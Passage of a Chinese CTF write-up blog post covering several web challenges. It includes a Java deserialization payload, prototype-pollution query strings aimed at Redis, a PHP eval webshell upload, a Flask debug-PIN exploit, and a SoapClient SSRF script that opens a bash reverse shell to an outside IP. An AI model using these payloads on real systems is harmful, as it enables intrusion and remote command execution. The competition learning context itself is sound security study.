ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到base64字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4</span><br></pre></td></tr></table></figure>
+<p>分别打入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147017369-489af2e3-1864-4da4-a4b7-42c781105ce8.png#averageHue=%23c0ac6d&clientId=u23785b68-07b0-4&from=paste&id=u7e9592b8&originHeight=545&originWidth=1134&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u0fed6e85-3b6d-4635-a89d-d3d00846fd2&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147017471-bc02250a-bdec-4777-bcfe-ce00e8c7df54.png#averageHue=%23f2f0ee&clientId=u23785b68-07b0-4&from=paste&id=uf5aef48b&originHeight=491&originWidth=1196&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ub793ab84-5017-4181-8ecd-a1180ed2661&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147017558-0c4f5a96-4b7f-496c-8e25-2f3b9c8aed6e.png#averageHue=%233f3d3d&clientId=u23785b68-07b0-4&from=paste&id=uc8511833&originHeight=225&originWidth=847&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ude220d71-7d30-40ab-a7d1-f0067a735a8&title="><br>收到反弹shell，读取flag结束</p>
+<h1 id="An4er-monitor"><a href="#An4er-monitor" class="headerlink" title="An4er_monitor"></a>An4er_monitor</h1><p>存在原型链污染。<br>写着写着就钻进去了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147017583-bb58dd7d-f669-43b5-877d-1749c50fbfa6.png#averageHue=%232c2e2c&clientId=u23785b68-07b0-4&from=paste&id=u323e3b24&originHeight=947&originWidth=1406&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ua22d377f-0a06-4091-bdc3-1317c30bc0d&title="><br>现在的情况是让题目代码中的securerandom为自定义的内容，或者是其他的方法覆盖他？（我目前的思路，图上的是js处理redis命令请求的部分，假如能污染某一处说不定有奇效？）<br>&#x2F;api&#x2F;server&#x2F;import路由处是进行原型链污染的点，可以污染任何undefined的对象。<br>现在的思路就如上，在ioredis进行get或者set的流程中是否有地方可以原型链污染，导致我们添加一个恶意的键进去？<br>问了一下龙哥，事实证明思路大致对了一半，但是想法可能有点歪</p>
+<ul>
+<li>首先通过原型链污染污染http.get里的options中的socketpath</li>
+<li>让请求走socket访问本地unixsocket</li>
+<li>然后设置options.method为SET，就会 <code>SET Adminxxx Http/1.1</code>?</li>
+</ul>
+<p>我们跟一下流程<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687193216668-a611032f-1e2f-4bfd-b728-2402070bb5a6.png#averageHue=%232b2d2a&clientId=u0f870d48-6430-4&from=paste&height=707&id=u755f52b8&originHeight=884&originWidth=1746&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2176534&status=done&style=none&taskId=ud2df92f2-9a1f-4543-b3b7-f9caecd0347&title=&width=1396.8" alt="image.png"><br>这里需要注意一下，由于我们method设置的是SET，在进入request()方法后，会进行一系列的处理，感兴趣的师傅可以自行debug，这里我忘了截图，然后我们也会读取socketpath，至于socketpath有什么用，我询问了chatgpt，他提供一个<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687193332235-d4ce62d1-0a34-4a6d-9ec2-c9daf9c84f3c.png#averageHue=%231e967e&clientId=u0f870d48-6430-4&from=paste&height=426&id=uad7c5cc0&originHeight=532&originWidth=1181&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55012&status=done&style=none&taskId=ufff000c6-28d0-4646-a9a7-60092f0775f&title=&width=944.8" alt="image.png"><br>大概的意思我们可以通过这个文件，与服务器进行通讯以及执行命令，redis也不例外，在这一题的redis.conf，我们可以发现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687193357482-8d3e37a1-ac97-4e99-8256-cbc84c91e3cf.png#averageHue=%23f4f3f2&clientId=u0f870d48-6430-4&from=paste&height=595&id=u3e7e8ed8&originHeight=744&originWidth=1594&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57859&status=done&style=none&taskId=u8ec3bfdc-a508-44ac-aca6-45c354adc8f&title=&width=1275.2" alt="image.png"><br>也就是说假如我们污染socketpath为这值，那么我们将与redis之间进行通讯，由于SET被当做了一个合法的指令，然后由于我们污染了socketpath，因此我们会使用socket与redis进行通讯，会发送一个header<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687193461270-3d4232cf-7e92-43a6-82b9-75962e92e22f.png#averageHue=%232b2d2a&clientId=u0f870d48-6430-4&from=paste&height=616&id=ue5c3364f&originHeight=770&originWidth=1702&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1840151&status=done&style=none&taskId=u38907e4d-7898-40d8-aedc-bae88db7f30&title=&width=1361.6" alt="image.png"><br>这里我的Path是<code>/</code>，假如把Path改为<code>IsADmin</code>，那么我们就可以利用这个只需SET指令，让<code>IsADmin=HTTP/1.1</code>了，这样就可以进行登录获取flag哈哈哈，我本地搭建一个环境。<br>因此我们只需要使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?urls.__proto__.method=SET</span><br><span class="line">?urls.__proto__.path=IsAdminSession</span><br><span class="line">?urls.__proto__.socketPath=/run/redis/redis.sock</span><br></pre></td></tr></table></figure>
+<p>然后访问check路由随便去触发一下那个http.get，之后访问&#x2F;getflag即可</p>
+<h1 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h1><p>首先题目入口进去应该是需要用session_upload_progress<br>去注册一个session，得到session后可以获得题目源码（upload_progress to set session,then we are in the chal）<br>你问我接下来怎么走？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/a</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=boogipop</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Length: 255</span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>extract可以通过数组注册任意变量，如properties和type都可以</li>
+<li>然后就可以自行控制if分支了</li>
+</ul>
+<p>有三个利用点(three points which are vul)</p>
+<ul>
+<li>$object-&gt;sctf()</li>
+<li>new $type($properties[0],$properties[1]);</li>
+<li>file_get_contents(‘<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/&#39;.$properties">http://127.0.0.1:5000/&#39;.$properties</a>);</li>
+</ul>
+<p>通过内置类去触发xxe，进而得到题目的源码app.py，这样就可以进行下一步的处理，这就xxe试试看。(xxe exploit to read anyfile)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147017966-4d637793-ef6e-4656-824b-bf4556ff3b31.png#averageHue=%23858482&clientId=u23785b68-07b0-4&from=paste&id=ue7edaef6&originHeight=848&originWidth=1582&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u6b9e7d94-9428-4f61-9f60-211584b64e1&title="><br>app.py:<br>The request content:<br>同样也开启了debug模式<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147018042-e7761e85-67b9-43ee-91f6-7133868026b4.png#averageHue=%23c1af7a&clientId=u23785b68-07b0-4&from=paste&id=u220ee670&originHeight=1080&originWidth=1716&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u8136171c-4a90-4c09-a09e-9f00a77bda2&title="><br>我们完全可以读取key，然后伪造一个pin码，由于还有一个利用条件没有用到，那就是上述第一个条件，可以触发一个__call方法，这里可以用SoapClient去SSRF，由于算pin码rce需要设置cookie的header。所以我们用SoapClient可以自定义请求包和请求内容，这样就完成了RCE！也符合题目写的hint:”简单 但也很绕”<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147018208-41370825-27f7-40c9-9fdd-6afff2b99986.png#averageHue=%23878584&clientId=u23785b68-07b0-4&from=paste&id=u09fa3c37&originHeight=715&originWidth=1424&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uc851d63d-920e-46c3-9f7e-3b902911a04&title="></p>
+<blockquote>
+<ul>
+<li>Machine id : 349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</li>
+<li>hex(Mac) : 0x0242ac130002 &#x3D;&gt; &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</li>
+<li>moddir:关于这一点比较他妈的操蛋，由于python服务没给我们输入的参数去触发报错，导致我们只可以取通过读目录的方式获取&#x2F;flask&#x2F;app.py在哪儿了。直接说结论吧，用GlobIterrator类配合glob伪协议去找每个可能一点的目录，最后在&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py，这个是问chatgpt后有思路的，因为&#x2F;etc&#x2F;passwd中的root用户对应&#x2F;bin&#x2F;ash,然后就找了一下</li>
+</ul>
+</blockquote>
+<p>最后在@zwx风信子的帮助下有了一个算pin的脚本,这是github的一个项目<br><code>https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py --username app --modname flask.app --appname Flask --basefile /usr/lib/python3.8/site-packages/flask/app.py --uuid 2485378023426 --machineid 349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147018178-28c9d8ed-ae46-4526-b11f-43e0ff625f7f.png#averageHue=%23403832&clientId=u23785b68-07b0-4&from=paste&id=u93079c4d&originHeight=710&originWidth=1499&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ucbbf1dcd-b1dd-43c5-8b65-ca63694ee29&title="><br>成功算出pin了。剩下的就和我之前的思路一样，去通过soapclient去访问debug界面，由于debugmode的rce需要携带cookie，因此只有soapclient可以做到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F114.116.119.253%2F7777%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687106351|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 115.239.215.75:8081</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like         Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=boogipop </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Length: 866</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">asdasda</span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line"></span><br><span class="line">a:2:&#123;s:10:&quot;properties&quot;;s:604:&quot;O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A207%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F114.116.119.253%252F7777%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687106351%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147018718-8c1ef20d-2623-4cb4-9623-7739b0790be7.png#averageHue=%23767574&clientId=u23785b68-07b0-4&from=paste&id=uc568c6d3&originHeight=695&originWidth=1635&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u09df4451-787a-4193-bdd8-3b76f1586fe&title="><br>后面用curl提个权读flag就行了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147018709-93a5747b-2e9a-4f92-9c4c-9faae753a516.png#averageHue=%23717070&clientId=u23785b68-07b0-4&from=paste&id=u25e43d0d&originHeight=695&originWidth=1638&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u19f47f43-553b-48ac-91c7-f343c90550e&title="></p>
+<h1 id="SycServer"><a href="#SycServer" class="headerlink" title="SycServer"></a>SycServer</h1><p>Vanzy爷爷太强拉，会逆向，然而我这只web狗并不会逆向，所以这题就挂啦~<br>我的思路是，肯定是利用zipslip去覆盖一下私钥，然后admin路由对私钥有一些处理，可惜我没逆出来呀！<br>赛后问了一下，在admin路由里其实是会执行<code>ssh -i rsa_key vanzy@xxxxx</code><br>这个指令去读取密钥文件的。然后我们可以再密钥文件里加入一条恶意的语句<br><code>command=xxxxxxx</code>，也就是标记ssh连接后干啥。写个反弹shell就出了呜呜<br>大致步骤就是</p>
+<ul>
+<li>zipslip去覆盖authorization文件</li>
+<li>访问admin让他读取密钥文件，触发command指令</li>
+<li>获取反弹shell</li>
+</ul>
+<p>这里设计到一个ssh指令的特性，ssh在读取密钥文件的时候，会识别密钥文件中的<code>command=xxx</code>，这样实际上就是一个ssh后门</p>
+<h1 id="X-D"><a href="#X-D" class="headerlink" title="X:D"></a>X:D</h1><p>附上一段小花絮：<br>和外国的vn师傅一起做的这道题，好久没感觉到CTF的激情了，然后这一次比赛VN的师傅也是火力全开，体验到了一次联队的热情，希望VN以后可以越来越好<br>以下是和外国的VN师傅zwx风信子的聊天花絮</p>
+<p>算pin<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147258555-5f813279-583a-44a3-8012-a18a90f1592f.png#averageHue=%23eeeeee&clientId=u23785b68-07b0-4&from=paste&height=316&id=u9bf4af2a&originHeight=395&originWidth=658&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43541&status=done&style=none&taskId=ubf5ff3a1-b743-487a-ba3c-13713064eec&title=&width=526.4" alt="image.png"><br>算cookie<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147209551-5dd589fe-49aa-465e-a934-cd9e8371cae8.png#averageHue=%23f4f4f3&clientId=u23785b68-07b0-4&from=paste&height=358&id=ud9886d00&originHeight=448&originWidth=693&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38335&status=done&style=none&taskId=ub3c8c7ca-8f57-44a5-b6d2-b7205ed47e2&title=&width=554.4" alt="image.png"><br>算出来啦<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147321698-51d8fda5-918f-4bd4-ae9a-bb83558c437e.png#averageHue=%23060606&clientId=u23785b68-07b0-4&from=paste&id=u300e1aa1&originHeight=158&originWidth=2880&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=86425&status=done&style=none&taskId=ubc9bc247-ef87-4305-aab1-1bda505cfbe&title=" alt="image.png"><br>debug soapclient的问题：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147356793-3af73543-b239-4265-bcd8-17973b2ae417.png#averageHue=%237a8483&clientId=u23785b68-07b0-4&from=paste&height=450&id=u2f824cc8&originHeight=563&originWidth=719&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=139136&status=done&style=none&taskId=u159986be-d08b-4d6e-ab41-3fcea46ad6d&title=&width=575.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147379368-6864626d-cf90-402c-b266-1899edf2cf4c.png#averageHue=%234a5760&clientId=u23785b68-07b0-4&from=paste&height=223&id=u587f1096&originHeight=279&originWidth=761&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57084&status=done&style=none&taskId=u510f7fb6-1c78-41d5-b9cc-30be6be37b1&title=&width=608.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147385785-f99ab1a0-4795-4118-b7ce-93a5bdea811e.png#averageHue=%2332353b&clientId=u23785b68-07b0-4&from=paste&height=326&id=ua3a33193&originHeight=408&originWidth=683&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51151&status=done&style=none&taskId=u644bc6e7-8c2b-4046-aef0-72c432dc004&title=&width=546.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147395792-b9e19a43-176e-41b0-823c-61adcef96b39.png#averageHue=%235a6464&clientId=u23785b68-07b0-4&from=paste&height=211&id=ub8589529&originHeight=264&originWidth=782&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39945&status=done&style=none&taskId=ua22039d0-475d-4ff0-b990-813aba5a488&title=&width=625.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147406336-5bd07742-3bbb-42e3-89f3-90f3e54ef8bb.png#averageHue=%2341412d&clientId=u23785b68-07b0-4&from=paste&height=343&id=u5c1f67f3&originHeight=429&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108469&status=done&style=none&taskId=u028a2361-6ac5-43fd-8561-692ea9c0cdc&title=&width=1054.4" alt="image.png"><br>到这里是可以在远程服务器执行命令，touch一个文件了，但是读不到flag，也cp不了flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147446042-0e0b7751-e25f-4e9d-9c20-026c9b801f8a.png#averageHue=%2331353d&clientId=u23785b68-07b0-4&from=paste&height=386&id=u433f0ad7&originHeight=482&originWidth=688&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49081&status=done&style=none&taskId=u561c12d8-252a-487c-891f-f6fb0ae537c&title=&width=550.4" alt="image.png"><br>到这里我以为内网的flask是不出网的，结果我傻逼了，咋可能不出网呢，被提醒之后就弹shell了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147469036-2490f128-5664-4545-9e34-1d95f3ad9841.png#averageHue=%2331343a&clientId=u23785b68-07b0-4&from=paste&height=560&id=u5a90b805&originHeight=700&originWidth=792&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110299&status=done&style=none&taskId=u6ab779a8-ca93-4fe1-ab9e-6b7d8c7392b&title=&width=633.6" alt="image.png"><br>最后就是提权得到flag，这一次比赛属于是打的比较开心了，vn的师傅也都非常的给力。best v&amp;n team</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">从CISCN西南分区赛学习Kryo反序列化</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Jackson反序列化通杀Web题(过时)</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
